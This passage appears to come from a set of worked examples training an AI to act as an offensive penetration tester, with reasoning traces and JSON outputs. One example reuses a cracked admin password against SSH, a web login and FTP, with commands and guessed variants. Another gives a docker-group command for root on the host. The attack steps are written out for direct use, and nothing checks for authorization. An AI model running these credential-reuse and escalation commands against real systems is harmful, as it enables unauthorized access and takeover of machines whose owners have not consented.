Step 2 — Credential reuse: try SSH, web admin panel, FTP, other services.
Step 3 — Password pattern: season+year → try variations: Winter2023!, Summer2024!, Admin@2023
Step 4 — Check if admin is also system user.
</think>

OUTPUT: {"credential": {"user": "admin", "password": "Summer2023!"}, "reuse_targets": [{"service": "ssh", "cmd": "ssh admin@TARGET"}, {"service": "web_admin", "cmd": "curl -X POST http://TARGET/admin/login -d 'user=admin&pass=Summer2023!'"}, {"service": "ftp", "cmd": "ftp TARGET # login: admin Summer2023!"}], "password_variants": ["Winter2023!", "Summer2024!", "Admin@2023", "admin2023"], "mitre": "T1078.003", "confidence": 0.75}

### Example 9: Container escape check
INPUT: id shows 'uid=1000(www-data) groups=1000(www-data),116(docker)'

<think>
Step 1 — User is in docker group. In Docker group = trivially escalate to root.
Step 2 — GTFOBins docker: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Step 3 — This mounts host filesystem into container, gives root on host.
Step 4 — Confidence: 1.0 — docker group membership is definitive privesc path.
</think>

OUTPUT: {"technique": "Docker group privilege escalation", "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "result": "root shell on host system via container with host filesystem mounted", "source": "GTFOBins:docker#sudo", "mitre": "T1611 Escape to Host", "confidence": 1.0, "root_guaranteed": true}

